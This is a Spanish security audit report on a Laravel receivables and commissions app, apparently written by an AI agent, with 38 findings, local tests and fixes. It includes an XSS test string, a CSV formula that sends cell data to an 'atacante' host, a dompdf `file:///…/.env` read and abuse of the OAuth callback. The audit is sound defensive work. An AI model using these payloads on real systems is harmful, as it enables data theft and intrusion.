# Auditoría de seguridad del gestor de cartera — octubre de 2026

Revisión previa a la salida a producción en GoDaddy (cPanel). Es la Fase 1 del agente «Ciberseguridad»: solo lectura, sin cambios de código. Las correcciones van en la Fase 2, cuando el usuario apruebe este informe.

- **Fecha:** 26 de octubre de 2026.
- **Código revisado:** `main` en `79929b0` (después del PR #75).
- **Gravedades:** crítica (explotable hoy, con daño grave), alta (daño grave en un escenario realista o con un error de configuración probable), media (daño acotado o que exige una condición previa) y baja (endurecimiento).

## Resumen

No hay hallazgos críticos. Las pantallas y las rutas respetan el alcance por asesor: lo probé en local cambiando ids en la URL y todo registro ajeno responde 404. La firma HMAC del robot es sólida y las dependencias no tienen vulnerabilidades conocidas.

Lo que más urge antes del primer despliegue:

1. **HTTPS sin forzar y sin HSTS** (S-01), con la cookie de sesión `Secure` dependiendo de una variable (S-02).
2. **Ninguna salvaguarda si el Document Root apunta a la raíz del repositorio** (S-03): se descargaría `.env`.
3. **Las copias de los correos de cobro aceptan cualquier dominio** (S-07): una cuenta de cartera comprometida puede sacar el estado de cuenta de todos los clientes.

Los dos repositorios públicos (S-04 y S-05) ya se cerraron el 26 de octubre: el usuario borró `SGX-Visualizador-Cartera` y volvió privado `SGX-Toma-De-Pedidos---SAP`. Queda revisar la VPN, porque su IP estuvo publicada.

| Id | Gravedad | Área | Hallazgo |
|---|---|---|---|
| S-01 | Alta | Servidor | No se fuerza HTTPS y no hay HSTS |
| S-02 | Media | Sesión | La cookie de sesión no es `Secure` por defecto |
| S-03 | Alta | Servidor | Sin salvaguarda si el Document Root apunta a la raíz |
| S-04 | Alta | Repos públicos | `SGX-Visualizador-Cartera`: IP de la VPN, arquitectura de SAP y datos personales (repositorio borrado; falta revisar la VPN) |
| S-05 | Media | Repos públicos | `SGX-Toma-De-Pedidos---SAP`: ids de Entra ID, URL de producción y dominio interno (ya es privado) |
| S-06 | Media | Servidor | No hay cabeceras de seguridad (CSP, X-Frame-Options, nosniff, Referrer-Policy) |
| S-07 | Media | Correo | Las copias (Cc) del cobro aceptan cualquier dominio externo |
| S-08 | Media | Correo | Las plantillas editables salen solas, sin aprobación de un segundo usuario |
| S-09 | Media | Acceso | Sin límite de intentos en el ingreso con Microsoft; cada fallo escribe una traza |
| S-10 | Media | Acceso | Sin límite de tasa en exportaciones, PDF y ZIP |
| S-11 | Media | Acceso | El ingreso de demostración depende solo de `APP_ENV` (corregido: bandera `DEMO_LOGIN`) |
| S-12 | Media | Acceso | Parámetros de empresa editables sin tener esa empresa asignada (excepción aceptada) |
| S-13 | Media | Registro | Faltan eventos en la auditoría (fallos de OAuth, cambio de empresa, lotes de correo…) |
| S-14 | Media | Registro | La auditoría es inmutable solo en el modelo, no en la base |
| S-15 | Media | Robot | `etl/notificar.py` hace STARTTLS sin verificar el certificado |
| S-16 | Baja | Acceso | El historial de Ingesta no filtra por empresa |
| S-17 | Baja | Acceso | El rol `asesor` se asigna solo, por coincidencia de correo con SAP |
| S-18 | Baja | API | Sin longitud mínima para las llaves HMAC y el token de Tesorería |
| S-19 | Baja | API | Lotes del robot de hasta 60 MB: un emisor con llave agota la memoria |
| S-20 | Baja | API | Sin nonce: un lote firmado se puede repetir dentro de los 300 s |
| S-21 | Baja | API | CORS abierto (`*`) en `/api/*` |
| S-22 | Baja | Correo | `GraphClient` manda el token a cualquier URL https guardada en la base |
| S-23 | Baja | Correo | El token de Graph y la sesión se guardan sin cifrar en MySQL |
| S-24 | Baja | Correo | Un cliente puede falsificar un rebote y alterar los informes de entrega |
| S-25 | Baja | Robot | Contraseña de la VPN en la línea de comandos y conexión a HANA sin cifrar |
| S-26 | Baja | Servidor | `Options -Indexes` solo aplica si existe `mod_negotiation` |
| S-27 | Baja | Servidor | El disco privado `local` se sirve por `/storage/{path}` firmado, sin uso |
| S-28 | Baja | Servidor | Proxies y hosts de confianza sin configurar |
| S-29 | Baja | Registro | Datos personales en los logs y retención sin definir |
| S-30 | Baja | Despliegue | `deploy.sh` no comprueba `APP_ENV`, `APP_DEBUG` ni los permisos de `.env` |
| S-31 | Baja | Secretos | Datos internos en archivos del repo privado (IP de la VPN, correos de empleados) |
| S-32 | Baja | Entradas | Los soportes de Comisiones se validan solo por extensión |
| S-33 | Baja | Entradas | La carga manual de cartera lee todo el XLSX antes de mirar el tope de filas |
| S-34 | Baja | Entradas | Descargas GET de Comisiones que generan y guardan documentos |
| S-35 | Baja | Entradas | Búsqueda de Equipo con `LIKE` sin escapar los comodines |
| S-36 | Baja | Entradas | La huella de la liquidación guardada es un SHA-256 sin llave |
| S-37 | Baja | Entradas | Mensajes de excepción internos visibles en las cargas de Bancos |
| S-38 | Baja | Entradas | dompdf con `chroot` en la raíz del proyecto y JavaScript activo |

---

## 1. Acceso

### Lo que probé en local

Levanté la app en `127.0.0.1:8123` con los seeders de demostración (SQLite temporal, sin `.env`) y entré como cada rol por `/dev/entrar`:

| Prueba | Resultado |
|---|---|
| El asesor demo abre la ficha, el estado de cuenta y el Excel de clientes ajenos (ids 2, 3, 7, 12, 24, 28, 999) | 404 en los tres, como si no existieran |
| El asesor abre compromisos ajenos (`/asesores/compromisos/{2..12}`) | 404; solo ve los suyos (1, 7 y 11) |
| El asesor escribe una nota, crea un compromiso o edita un compromiso de un cliente ajeno con datos válidos | 404; nada quedó escrito (lo comprobé como analista) |
| El asesor abre Cartera, Cobro, Bancos, Gerencia, Comisiones, Ingesta, Equipo, Empresas y el equipo comercial | 403 en todas |
| El asesor cambia a SDC y a la vista de grupo | Solo aparecen sus clientes de cada empresa |
| La gerente comercial abre clientes de asesores que no son de su equipo | 404 |
| `GET /logout` | 405 (solo POST) |
| POST sin token CSRF | 419 |

### S-09 · Media · Sin límite de intentos en el ingreso con Microsoft

- **Dónde:** `app/Modules/Core/routes/web.php:21-26` (grupo `guest` sin `throttle`) y `app/Modules/Core/Http/Controllers/Auth/MicrosoftCallbackController.php:33-34` (`report($exception)` en cada fallo).
- **Cómo se explotaría:** un anónimo repite `GET /auth/microsoft/callback?state=x&code=y`. En local mandé 25 seguidas y todas respondieron 302, sin ningún 429. Cada una lanza `InvalidStateException`, escribe su traza completa en `storage/logs` y crea una fila en `sessions`. Así se llena la cuota de disco o de MySQL del hosting compartido y se tapan eventos reales. No hay contraseñas propias que adivinar, así que el riesgo es de disponibilidad, no de acceso.
- **Corrección:** un limitador `core-auth` (`Limit::perMinute(10)->by($request->ip())`) en el grupo `guest`, desde `CoreServiceProvider::bootModule()`. En el `catch`, no reportar `InvalidStateException` y registrar `core.auth.failed` en la auditoría (S-13).

### S-10 · Media · Sin límite de tasa en exportaciones, PDF y ZIP

- **Dónde:** `app/Modules/Cartera/routes/web.php:42-43`, `app/Modules/Asesores/routes/web.php:27,29-30`, `app/Modules/Comisiones/routes/web/informes.php:27-31` y `app/Modules/Comisiones/routes/web/liquidacion.php:22-23`.
- **Cómo se explotaría:** una cuenta comprometida descarga toda la cartera a la que tiene alcance (NIT, saldos, contactos) a máxima velocidad. Las peticiones a dompdf o al ZIP también pueden saturar la CPU del plan compartido.
- **Corrección:** un limitador `exports` (`Limit::perMinute(10)->by($request->user()?->id ?: $request->ip())`) aplicado desde el proveedor de cada módulo. Ya existe el patrón: `throttle:10,1` en la prueba de Cobro (`app/Modules/Cobro/routes/web.php:30`).
- **Estado: corregido** en el PR 9a de la Fase 2.
  - Cada módulo define su limitador en su proveedor: `cartera-exports`, `asesores-exports` y `comisiones-exports`. Son 10 descargas por minuto por usuario (por IP si no hay sesión), contadas juntas entre todas las descargas del módulo; la siguiente recibe un 429.
  - También quedan limitadas dos descargas de Comisiones que este hallazgo no listaba: el soporte de una captura (`ajustes/{tipo}/{captura}/soporte`) y la plantilla del presupuesto (`presupuesto/{periodo}/plantilla`).
  - Bancos no tiene descargas de archivos; su API ya tenía `throttle:bancos-api`.

### S-11 · Media · El ingreso de demostración depende solo de `APP_ENV`

- **Dónde:** `routes/web.php:31-36`, `app/Http/Controllers/Dev/DemoLoginController.php:79-83`, `database/seeders/DatabaseSeeder.php:16-21` y `deploy/deploy.sh:69-78`.
- **Qué está bien:** las rutas `/dev/entrar` no existen fuera de `local`; el controlador vuelve a mirar el entorno, exige `REMOTE_ADDR` de loopback y un POST con CSRF; `/dev/componentes` responde 404 fuera de `local`. Lo cubre `tests/Feature/Dev/DevLoginRouteTest.php`.
- **Cómo se explotaría:** si el `.env` del servidor queda con `APP_ENV=local` (copiado de un equipo), el despliegue siembra los usuarios de demostración, entre ellos un administrador con las dos empresas, y deja `/dev/entrar` en la caché de rutas. El candado de loopback no basta en un hosting compartido: otra cuenta del mismo servidor puede llamar a `http://127.0.0.1` con el `Host` del dominio (por confirmar con GoDaddy). En ese caso entraría como administrador sin Microsoft.
- **Corrección:** exigir además una bandera explícita (`DEMO_LOGIN`, falsa por defecto) en la ruta, el controlador y los `*DemoSeeder`; y que `deploy.sh` aborte si el entorno no es `production` (S-30).
- **Estado: corregido** en el PR 4 de la Fase 2.
  - `/dev/entrar` exige `APP_ENV=local` y `DEMO_LOGIN=true` (`config('app.demo_login')`, falso por defecto), tanto en `routes/web.php` como en el controlador.
  - `deploy/check-env.sh` rechaza `DEMO_LOGIN` activo, y desde el PR 2 también `APP_ENV` distinto de `production`.
  - Los `*DemoSeeder` siguen atados solo a `APP_ENV=local`: el rechazo de `APP_ENV=local` en el despliegue ya los deja fuera de producción, y atarlos a la bandera tocaría las pruebas de cinco módulos sin bajar más el riesgo.

### S-12 · Media · Parámetros de empresa editables sin tener esa empresa asignada

- **Dónde:** `app/Modules/Core/Http/Controllers/Companies/CompanyParametersController.php:35` (`edit`) y `:43` (`update`). El README de Core lo declara intencional.
- **Cómo se explotaría:** un `gerente_cartera` asignado solo a SDC envía `PUT /empresas/SGX` con `grace_days=365`. Se recalculan los estados de todos los clientes de SGX, una empresa que no puede ver.
- **Corrección:** comprobar `$empresa` contra `CurrentCompany::available()` (404 si no está) en `edit` y `update`, y filtrar `index`. Si el negocio confirma que la gerencia es transversal a las dos empresas, dejarlo escrito como excepción a A.5.
- **Estado: excepción aceptada** por el usuario el 26 de octubre de 2026. La gerencia de cartera y TI (permiso `core.companies.manage`) pueden editar los parámetros de cualquier empresa, aunque no la tengan asignada, porque administran las reglas de las dos. No se cambia el código. Cada cambio sigue quedando en la auditoría como `core.company.updated`.

### S-16 · Baja · El historial de Ingesta no filtra por empresa

- **Dónde:** `app/Modules/Ingesta/Http/Controllers/LoadHistoryController.php:42` (`IngestaLoad::query()` sin empresa), `:62-65` (bloque «vigente») y `:72` (`show` sin comprobación).
- **Cómo se explotaría:** una analista asignada solo a SDC abre `GET /ingesta/cargas/{id}` de una carga de SGX y ve el total y el vencido de la cartera de SGX. Solo tienen el permiso `ingesta.view` los roles admin, gerente y analista de cartera, por eso es baja.
- **Corrección:** el patrón de `Bancos/Http/Controllers/LoadController.php:50`: `whereIn('company', available())` en el índice y 404 en `show`.

### S-17 · Baja · El rol `asesor` se asigna solo, por coincidencia de correo con SAP

- **Dónde:** `app/Modules/Core/Application/Auth/SignInWithMicrosoft.php:156-214` y `MicrosoftIdentity.php:50` (`mail` o, si falta, el UPN).
- **Cómo se explotaría:** quien pueda cambiar el correo de un vendedor en SAP (`OSLP.Email`) pone el suyo de Entra ID. En su primer ingreso recibe el rol `asesor` y ve los clientes de ese vendedor. Una cuenta invitada (B2B) del tenant con un `mail` que coincida tendría el mismo efecto (por confirmar si el tenant tiene invitados).
- **Qué está bien:** el tenant se valida dos veces (`AppServiceProvider.php:53-70` y el claim `tid` en `SignInWithMicrosoft.php:68-76`), el id token se valida con JWKS y el `microsoft_id` queda fijo después del primer vínculo.
- **Corrección:** rechazar invitados (claim `acct = 1`), aceptar solo los dominios de la empresa y avisar al administrador cuando se asigne un rol automáticamente.

### S-02 · Media · La cookie de sesión no es `Secure` por defecto

- **Dónde:** `config/session.php:172`: `'secure' => env('SESSION_SECURE_COOKIE')`, sin valor por defecto. En local la cookie salió con `httponly; samesite=lax` y sin `secure`.
- **Cómo se explotaría:** si el `.env` de producción omite la variable, la cookie viaja también por `http://` (S-01) y se puede robar la sesión en una red hostil.
- **Corrección:** `env('SESSION_SECURE_COOKIE', str_starts_with((string) env('APP_URL'), 'https://'))`. Opcional: nombre `__Host-` para la cookie.

### Controles de acceso verificados

- Revisé la lista completa de rutas (`php artisan route:list`). Toda ruta de negocio tiene `auth` y su `can:`. Las únicas sin `can:` son las comunes a cualquier usuario con sesión (`/`, `sin-acceso`, `POST empresa`, `POST logout`). Sin `auth` quedan el ingreso con Microsoft, `/up`, las rutas `/dev/*` (solo en local) y `GET` y `PUT /storage/{path}`, que exigen una URL firmada (S-27).
- Las rutas con id resuelven el registro con el alcance de Core y responden 404 fuera de él: `CarteraRepository::client()`, `CompromisoService::find()` y `lockForWrite`, `ClientReach` en `DeleteActivity.php:33` y `ClientDeletion.php:68-72`, `VisibleCompanies::canSee` en Bancos, `scope()` en `Cobro/RunReportController.php:70`.
- Ningún controlador usa `CarteraRepository::asSystem()`; solo jobs, comandos y listeners.
- La sesión se regenera al entrar (`MicrosoftCallbackController.php:45-46`) y se invalida, con token nuevo, al salir (`LogoutController.php:23-25`). No hay «recordarme».
- Socialite trabaja con `state` (no `stateless()`). Los usuarios inactivos se expulsan en cada petición (`EnsureUserIsActive`); los borrados no entran.
- La empresa activa se revalida contra `CompanyAccess` en cada lectura (`SessionCurrentCompany.php`).
- Comisiones separa funciones: nadie aprueba lo que capturó (`ApprovalGuard::mayReview`).
- No hay excepciones de CSRF; las rutas `/api/*` no usan sesión.
- `db:seed --force` solo corre los `*PermissionSeeder`; los usuarios demo usan `ryr.test`, que no puede entrar por Microsoft.

---

## 2. Entradas

### Lo que probé en local

| Prueba | Resultado |
|---|---|
| El asesor guarda la nota `<script>alert("xss")</script><img src=x onerror=alert(1)>` en su cliente | Sale escapada (`&lt;script&gt;`) en su ficha y en la de la analista; ningún `<script>` crudo |
| `GET /login?x=<script>` | 200, sin reflejar el parámetro |

### Controles verificados

- **SQL:** los `selectRaw`, `orderByRaw` y `whereRaw` solo interpolan constantes o valores ya validados (`SnapshotTotals.php`, `EloquentCarteraRepository.php:110,207`, `ClientListing.php:85-123`). El orden sale de listas blancas, dos veces: en el filtro del módulo y en `ClientQuery.php:63-68` y `CommitmentQuery.php:55-60`. Las búsquedas de clientes escapan `%` y `_` con `ESCAPE '!'` (`ClientListing.php:126-133`); Bancos los neutraliza (`MovementSearch.php:52`). No hay `DB::statement` ni `DB::select` con datos externos.
- **XSS:** los únicos `{!! !!}` reciben texto ya escapado (los párrafos de los correos, sección 4) o un mapa estático de íconos (`ui/icon.blade.php:18`). El correo de los clientes, que controla un tercero, se pide en texto plano y se muestra escapado; su enlace solo se pinta si empieza por `https://`. Alpine usa `x-text`, nunca `x-html`; los datos van con `@js()`. La paleta de marca se valida como hex antes de entrar a un `<style>` (`BrandPalette.php:21,45-49`).
- **CSRF:** sin excepciones en `bootstrap/app.php`; `apiFetch` manda `X-CSRF-TOKEN`; `logout` y `empresa` son POST.
- **Asignación masiva:** todos los modelos declaran `#[Fillable]`; no hay `$guarded = []`, `$request->all()` ni `fill($request->…)`; los FormRequest arman los datos desde `validated()`.
- **Archivos subidos:**
  - Carga manual de cartera: disco privado, nombre UUID, ruta y SHA-256 ligados a la sesión y al usuario, rutas con `whereUuid`, borrado al confirmar o descartar (`ManualUploadController.php:61-92,151-157`).
  - Extractos de bancos: se leen del temporal y nunca se guardan; tope de 50 000 filas; HTML con `LIBXML_NONET` (`Bancos/Infrastructure/Files/TabularFile.php:28,68,145`). La carpeta de importación por defecto está en `storage/app/private`.
  - CSV de migración: solo por consola, con `--dir` del operador y nombres de archivo fijos (`MigrationCommand.php:151-188`).
- **Exportaciones:** el texto va siempre como celda de texto (`Cartera/Infrastructure/Export/Cells.php:44-47`, igual en Comisiones y Asesores), así que un nombre de cliente que empiece por `=` no se vuelve fórmula. La plantilla CSV del presupuesto antepone un apóstrofo (`BudgetSheet.php:225-233`).
- **Otros:** redirecciones `volver` validadas contra el host (`MovementController.php:88-99`); `unserialize` con `allowed_classes`; sin `eval`, `exec` ni `shell_exec` en `app/`; ids escapados con `rawurlencode` hacia Graph.

### S-32 · Baja · Los soportes de Comisiones se validan solo por extensión

- **Dónde:** `app/Modules/Comisiones/Http/Support/CaptureFields.php:30` (regla `extensions`, sin `mimes`) y `app/Modules/Comisiones/Infrastructure/Captures/Supports.php:30-34`, que guarda con la extensión que manda el cliente.
- **Cómo se explotaría:** quien tenga `comisiones.capture` sube `soporte.csv` con `=HYPERLINK("http://atacante/?x="&A1,"ver")` o una fórmula DDE. El aprobador lo descarga, lo abre en Excel y se ejecuta. También se puede subir un HTML renombrado como `.pdf`; se descarga como adjunto, pero sin `nosniff` (S-06).
- **Corrección:** agregar `mimes:pdf,jpg,jpeg,png,xlsx,csv`, guardar con `guessExtension()`, descargar como `application/octet-stream` con `nosniff`, y rechazar o neutralizar celdas CSV que empiecen por `= + - @`.
- **Estado: corregido** en el PR 11a de la Fase 2.
  - La regla `SupportFile` exige que el contenido real (el tipo que lee finfo) corresponda a la extensión, así que un HTML renombrado como `.pdf` se rechaza. El soporte se guarda con su extensión, ya comprobada, y se descarga como `application/octet-stream`; `nosniff` ya llega desde `public/.htaccess`.
  - Por decisión del usuario, un CSV con una celda que empiece por `=`, `+`, `-` o `@` se rechaza al subirlo (el mensaje dice la fila y la columna), salvo que la celda sea un número, como `-5.000,50` o `-5000`. Los soportes ya guardados no cambian.
  - Las fórmulas dentro de un XLSX quedan fuera del alcance, también por decisión del usuario.

### S-33 · Baja · La carga manual de cartera lee todo el XLSX antes del tope

- **Dónde:** `app/Modules/Ingesta/Infrastructure/Manual/CarteraWorkbookReader.php:88-108` acumula todas las filas; `ingesta.max_rows` (200 000) se aplica después, en `BatchValidator.php:106-111`. El archivo puede pesar 20 MB (`ManualUploadRequest.php:46`).
- **Cómo se explotaría:** quien tenga `ingesta.upload` sube un XLSX muy comprimido con millones de filas y agota la memoria o el tiempo de PHP del hosting.
- **Corrección:** cortar dentro del bucle al pasar `max_rows`, como ya hacen Bancos (`TabularFile.php:28,68`) y Comisiones.

### S-34 · Baja · Descargas GET de Comisiones que generan y guardan documentos

- **Dónde:** `app/Modules/Comisiones/routes/web/informes.php:28-31`; `ReportsController::zip`, `pdf` y `payroll` (`ReportsController.php:111-192`) generan, guardan y auditan el documento si falta.
- **Cómo se explotaría:** una página externa hace navegar a la víctima a `/comisiones/periodos/2026-09/informes.zip` (`SameSite=Lax` manda la cookie en esa navegación). Se generan documentos y entradas de auditoría que el usuario no pidió. Es idempotente y solo aplica a liquidaciones cerradas.
- **Corrección:** que las descargas solo lean (404 o redirección si falta el documento) y dejar la generación en el `POST informes/generar` que ya existe.

### S-35 · Baja · Búsqueda de Equipo con `LIKE` sin escapar

- **Dónde:** `app/Modules/Core/Application/Team/TeamDirectory.php:166-169`.
- **Cómo se explotaría:** no es inyección SQL (va con parámetros); un administrador que busca `%` ve a todos. Impacto mínimo.
- **Corrección:** reutilizar el escape de `ClientListing`.
- **Estado: corregido** en el PR 13 de la Fase 2.
  - El escape de `ClientListing` pasó a `Core/Infrastructure/Persistence/LikePattern.php` (`LIKE ? ESCAPE '!'`, porque SQLite no tiene carácter de escape por defecto). `ClientListing` lo usa sin cambiar lo que hace.
  - La búsqueda de Equipo usa el mismo patrón en el nombre y en el correo; el correo se normaliza (`User::normalizeEmail`) antes de escaparlo. Buscar `%` o `_` solo encuentra a quien los tiene.
  - Las otras búsquedas con `LIKE` no tienen el problema: Bancos (`MovementSearch`) cambia `%` y `_` por espacios, y Cobro (`InboundLinker`) usa el `LIKE` solo para acotar candidatos y luego compara el correo exacto.

### S-36 · Baja · La huella de la liquidación es un SHA-256 sin llave

- **Dónde:** `app/Modules/Comisiones/Infrastructure/Settlement/ResultSerializer.php:113-115` y `:125-132`.
- **Cómo se explotaría:** quien pueda escribir en `comisiones_liquidaciones` (acceso a la base) cambia las cifras, recalcula el SHA-256 y la verificación pasa. El `unserialize` está limitado a clases del dominio, así que no hay inyección de objetos.
- **Corrección:** `hash_hmac('sha256', $payload, config('app.key'))` comparado con `hash_equals`; a mediano plazo, JSON en vez de `serialize`.

### S-37 · Baja · Mensajes de excepción visibles en las cargas de Bancos

- **Dónde:** `app/Modules/Bancos/Application/Import/FolderImporter.php:150-153` guarda `$e->getMessage()` en los errores de la carga, que ve cualquiera con `bancos.view`.
- **Cómo se explotaría:** el mensaje puede traer rutas del servidor, SQL o nombres de tablas que ayudan a preparar otro ataque.
- **Corrección:** mensaje genérico para el usuario; el detalle ya va a `report($e)`.
- **Estado: corregido** en el PR 9b de la Fase 2.
  - Un error inesperado deja el mensaje genérico `bancos::cargas.error_inesperado` en el historial de cargas, en el `.error.txt` de `errores/` y en la consola; el detalle solo va al log de errores con `report($e)`.
  - Los mensajes propios del módulo (archivo ilegible, extracto de otro banco) no cambian.

### S-38 · Baja · dompdf con `chroot` en la raíz y JavaScript activo

- **Dónde:** no hay `config/dompdf.php`, así que rigen los valores del paquete: `chroot = base_path()` (incluye `.env` y `storage/`) y `enable_javascript = true`. Los dos renderizadores sí fuerzan `isRemoteEnabled = false` (`Asesores/Infrastructure/Report/PdfRenderer.php:22`, `Comisiones/Infrastructure/Report/PdfRenderer.php:22`).
- **Cómo se explotaría:** hoy no se puede: las plantillas PDF solo usan `{{ }}`. Si algún día entrara HTML del usuario, un `<img src="file:///…/.env">` podría leer archivos del servidor dentro del PDF.
- **Corrección:** `setOption('chroot', resource_path('fonts'))` (o el directorio mínimo) e `isJavascriptEnabled = false` en los dos renderizadores.

---

## 3. API de ingesta del robot y API de Tesorería

### Lo que probé en local

| Prueba | Resultado |
|---|---|
| `POST /api/ingesta/cartera` sin firma o con firma falsa | 401 «Firma inválida.», sin detalle |
| `GET /api/recaudo` con token falso | 401 |
| Preflight CORS desde `https://evil.example` | `Access-Control-Allow-Origin: *` (S-21) |

### Controles verificados

- **Qué se firma:** timestamp, método, la ruta reconstruida desde `{lote}` y el SHA-256 de los bytes crudos del cuerpo, unidos con `\n` (`app/Modules/Ingesta/Infrastructure/Robot/RequestSigner.php:21-24`). Se compara con `hash_equals` (`:39`).
- El timestamp se valida en los dos sentidos (`VerifyRobotSignature.php:88-94`). Sin llaves configuradas la API queda cerrada (`:46`). Todas las fallas responden el mismo 401; el log guarda motivo, IP e id de llave, nunca el secreto ni el cuerpo.
- Límite de tamaño antes de descomprimir y descompresión con tope (`ReceiveBatchController.php:47,93`); solo `gzip` o `identity`; el lote debe ser un valor de `Dataset`.
- Un lote repetido no hace nada: idempotencia por el índice único `accepted_batch_id` (`EloquentIngestaSink.php:54-58,79-84`).
- Limitadores `ingesta-robot` y `bancos-api` de 60 por minuto (`IngestaServiceProvider.php:38`, `BancosServiceProvider.php:41`).
- Tesorería: token Bearer solo por cabecera, comparado con `hash_equals` sobre su hash, tokens distintos para leer y escribir, API cerrada sin token (`Bancos/Http/Middleware/VerifyTreasuryToken.php:31-39`).
- El robot (`etl/sinks/http_sink.py`) verifica TLS, no sigue redirecciones, exige https salvo en hosts locales y redacta los secretos en su log.

### S-18 · Baja · Sin longitud mínima para las llaves HMAC y el token de Tesorería

- **Dónde:** `app/Modules/Ingesta/Infrastructure/Robot/HmacKeyring.php:36` y `app/Modules/Bancos/Http/Middleware/VerifyTreasuryToken.php:31` aceptan cualquier valor no vacío.
- **Cómo se explotaría:** con un secreto corto, una sola petición firmada capturada permite adivinarlo por fuerza bruta fuera de línea y firmar lotes falsos de cartera.
- **Corrección:** rechazar secretos de menos de 32 bytes, con aviso en el log, igual que hoy se tratan los pares mal formados.
- **Estado: corregido** en los PR 6 (Ingesta) y 9b (Tesorería) de la Fase 2.
  - `HmacKeyring` ignora, con una advertencia en el log, los pares cuyo secreto tiene menos de 32 bytes.
  - `VerifyTreasuryToken` trata un token de menos de 32 bytes (`MIN_TOKEN_BYTES`) como uno sin configurar: la API queda cerrada y el log avisa con el nombre del ajuste, nunca con el token.

### S-19 · Baja · Lotes de hasta 60 MB: un emisor con llave agota la memoria

- **Dónde:** `app/Modules/Ingesta/config/ingesta.php:16,19` (20 MB comprimidos y 60 MB descomprimidos), `ReceiveBatchController.php:101` (`json_decode` completo), `:128-129` (sin tope de columnas) y `Application/BatchValidator.php:110` (`max_rows` se mira después de construir todas las filas).
- **Cómo se explotaría:** quien tenga una llave, o un atacante que conozca un id de llave y haga calcular el SHA-256 de 20 MB desde muchas IP, provoca errores 500 o satura la CPU del plan compartido.
- **Corrección:** bajar los topes a lo real (una cartera de miles de filas ocupa pocos MB), exigir que las columnas coincidan con el esquema antes de recorrer filas, cortar al pasar `max_rows` y agregar un límite global además del de IP.
- **Estado: corregido** en el PR 12 de la Fase 2.
  - Topes a la medida de los lotes reales (el más grande trae 1458 filas; los maestros, hasta 6178): 4 MB por petición, 16 MB descomprimidos y 20 000 filas. Como `gzdecode` puede pasarse un poco de su límite, el largo descomprimido se revisa otra vez.
  - Antes de leer las filas, el controlador exige exactamente las columnas del esquema (y no más de 100, antes de la regla `distinct`) y corta al pasar `max_rows`; los dos casos responden 422 sin entrada en el historial.
  - `ingesta-robot` suma un límite global de 120 peticiones por minuto al de 60 por IP. Ese límite se cuenta antes de revisar la firma, así que alguien sin llave puede agotarlo; por eso el robot (`etl/sinks/http_sink.py`) reintenta los 429 esperando lo que diga `Retry-After` (60 s si no viene), hasta 3 veces y 10 minutos en total, y después falla y avisa como cualquier otro fallo.
  - **Para el despliegue:** cuando TI confirme la IP fija del PC del robot, se puede dejar fuera del límite global (sigue con su límite de 60 por IP y con la firma). Así nadie puede bloquear al robot agotando el cupo compartido. Antes hay que confirmar que `request()->ip()` es la IP real y no la de un proxy (S-28).
  - Cada 422 deja una advertencia en el log con el lote, la empresa, las filas, el motivo, hasta 10 llaves de error y el id de la llave; nunca valores ni mensajes del lote.

### S-20 · Baja · Sin nonce dentro de la ventana de 300 s

- **Dónde:** `app/Modules/Ingesta/Http/Middleware/VerifyRobotSignature.php:92`.
- **Cómo se explotaría:** el daño es bajo: repetir un lote aceptado no hace nada y cambiar el `batch_id` exige volver a firmar. Repetir un lote **rechazado** sí duplica filas en el historial.
- **Corrección:** guardar la firma vista (`Cache::add('ingesta:sig:'.$signature, 1, $skew * 2)`) y rechazar la segunda.

### S-21 · Baja · CORS abierto en `/api/*`

- **Dónde:** no hay `config/cors.php`; rige el del framework (`paths: ['api/*']`, `allowed_origins: ['*']`). Confirmado en local con el preflight.
- **Cómo se explotaría:** el riesgo es bajo porque la API usa HMAC y Bearer, que el navegador no adjunta solo. Pero cualquier sitio podría leer `/api/recaudo` con un token que un usuario pegue en un script.
- **Corrección:** publicar `config/cors.php` con `'paths' => []`: la API la usan el robot y Tesorería, no navegadores.

### S-15 · Media · El robot hace STARTTLS sin verificar el certificado

- **Dónde:** `etl/notificar.py:39` llama a `smtp.starttls()` sin `context`. Comprobé en la biblioteca estándar que, sin contexto, `smtplib` usa `ssl._create_stdlib_context()`, que no verifica el certificado ni el nombre del servidor.
- **Cómo se explotaría:** alguien en posición de intermediario en la red del equipo del robot presenta un certificado propio, captura `ALERTA_SMTP_USER` y `ALERTA_SMTP_PASSWORD` en `smtp.login()` y después envía correo como ese buzón.
- **Corrección:** `smtp.starttls(context=ssl.create_default_context())`.

### S-25 · Baja · Contraseña de la VPN en la línea de comandos y HANA sin cifrar

- **Dónde:** `etl/vpn.py:94-99` pasa `-p <contraseña>` a `sccli`, visible en la lista de procesos del equipo (es una limitación de `sccli`). `etl/hana.py:74-83` conecta sin `encrypt=True`.
- **Cómo se explotaría:** otro usuario o proceso del equipo del robot lee la contraseña de la VPN; el tráfico entre la puerta de la VPN y HANA va en claro.
- **Corrección:** cuenta de Windows dedicada al robot, sin otros usuarios en el equipo, y `encrypt=True, sslValidateCertificate=True` en HANA (probar primero con TI que el servidor HANA tiene certificado).

---

## 4. Correos

### Controles verificados

- Graph recibe JSON, no MIME armado a mano. No se mandan nombres visibles y el asunto colapsa los saltos de línea: no hay inyección de cabeceras (`app/Modules/Cobro/Infrastructure/Mail/GraphMailSender.php:139-170`, `NoticeRenderer.php:32`).
- Las plantillas se escapan antes de llegar a los únicos `{!! !!}` de los correos (`NoticeRenderer.php:119-122`; `cobro-semanal.blade.php:41,72`, `estado-cartera.blade.php:50,84`). Solo admiten las variables permitidas (`Placeholders.php:36-45`).
- **Nadie puede escribir un destinatario «Para» arbitrario.** Los destinatarios salen de los contactos de SAP que trae el robot. El envío de prueba va solo al correo del usuario conectado, con `cobro.manage`, `throttle:10,1` y el alcance del cliente (`RunPreviewController.php:107,122-128`).
- Los envíos masivos solo los dispara el programador, a 25 por minuto entre los dos buzones (`CobroServiceProvider.php:66`).
- El correo entrante de los clientes se pide en texto plano, se trunca, se muestra escapado y no se descargan adjuntos (`MailboxSync.php:70,154`; `respuestas/show.blade.php:60`).

### S-07 · Media · Las copias (Cc) aceptan cualquier dominio externo

- **Dónde:** `app/Modules/Cobro/Http/Requests/UpdateCopiesRequest.php:24-42`: solo exige un correo válido con punto en el dominio. Llega al envío por `Infrastructure/Runs/WeeklyCollection.php:87,159`, `Circularizacion/CircularizationRun.php:106,176` y `Infrastructure/Runs/SendRunItem.php:120`.
- **Cómo se explotaría:** una cuenta de cartera comprometida (gerente o analista, permiso `cobro.manage`) envía `PUT /cobro/copias/SGX` con `fijos=tercero@gmail.com`. Desde el siguiente envío programado, cada estado de cuenta de cada cliente sale del buzón oficial con copia a ese tercero: nombre, NIT, facturas y saldos. Es una fuga masiva de datos personales y comerciales (Ley 1581). Queda auditado (`CopyStore.php:52`), pero después del hecho.
